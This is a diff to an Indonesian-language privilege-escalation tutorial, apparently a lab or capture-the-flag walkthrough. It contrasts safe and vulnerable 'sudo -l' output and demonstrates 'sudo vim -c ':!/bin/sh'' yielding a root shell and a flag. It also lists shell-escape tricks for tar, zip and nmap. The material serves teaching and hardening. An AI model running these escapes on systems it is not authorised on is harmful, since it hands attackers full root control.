@@ -24,16 +24,37 @@
 sudo -l
 ```
 
-Contoh output:
+Tampilan **aman** (user tidak punya akses sudo):
 
 ```text
-User tester may run the following commands on target:
-    (root) NOPASSWD: /usr/bin/vim
-    (root) NOPASSWD: /usr/bin/find
-    (root) NOPASSWD: /usr/bin/python3
+tester@webserver:~$ sudo -l
+[sudo] password for tester:
+Sorry, user tester is not allowed to run sudo on webserver.
 ```
 
-> **Perhatikan:** Entry `NOPASSWD` berarti command dapat dijalankan sebagai root **tanpa password** — langsung dieksploitasi.
+Tampilan **aman** (hanya command spesifik, tidak bisa diabuse):
+
+```text
+User tester may run the following commands on webserver:
+    (root) NOPASSWD: /usr/bin/systemctl restart apache2
+```
+
+> Command spesifik dengan argumen eksplisit — **relatif aman**, tidak bisa dipakai spawn shell.
+
+Tampilan **rentan** (ada binary yang bisa spawn shell):
+
+```text
+www-data@jobportal:~$ sudo -l
+Matching Defaults entries for www-data on jobportal:
+    env_reset, mail_badpass, secure_path=/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User www-data may run the following commands on jobportal:
+    (root) NOPASSWD: /usr/bin/vim          ← RENTAN! vim bisa shell escape
+    (root) NOPASSWD: /usr/bin/find         ← RENTAN! find bisa -exec shell
+    (root) NOPASSWD: /usr/bin/python3      ← RENTAN! python3 bisa setuid(0)
+```
+
+> **Perhatikan:** Entry `NOPASSWD` berarti command dapat dijalankan sebagai root **tanpa password** — langsung dieksploitasi. Semua binary di atas punya teknik shell escape di GTFOBins.
 
 ---
 
@@ -102,6 +123,23 @@ nmap> !sh
 | `tar` | `--checkpoint-action=exec=/bin/sh` | Exec arbitrary command |
 | `zip` | Flag `-TT` | Exec command via test |
 | `nmap` | `--interactive` + `!sh` | Mode interaktif lama (v < 7.92) |
+
+---
+
+## Langkah 3: Contoh Tampilan Eksploitasi (Root Shell)
+
+```text
+www-data@jobportal:~$ sudo vim -c ':!/bin/sh'
+
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# whoami
+root
+# cat /root/flag.txt
+FLAG{sudo_vim_shell_escape_to_root}
+```
+
+> **Capture:** Eksploitasi berhasil — sudo menjalankan vim sebagai root, lalu `:!/bin/sh` spawn shell dengan `uid=0(root)` penuh. Berbeda dengan SUID yang hanya menghasilkan `euid=0`, sudo benar-benar berganti user ke root.
 
 ---
 
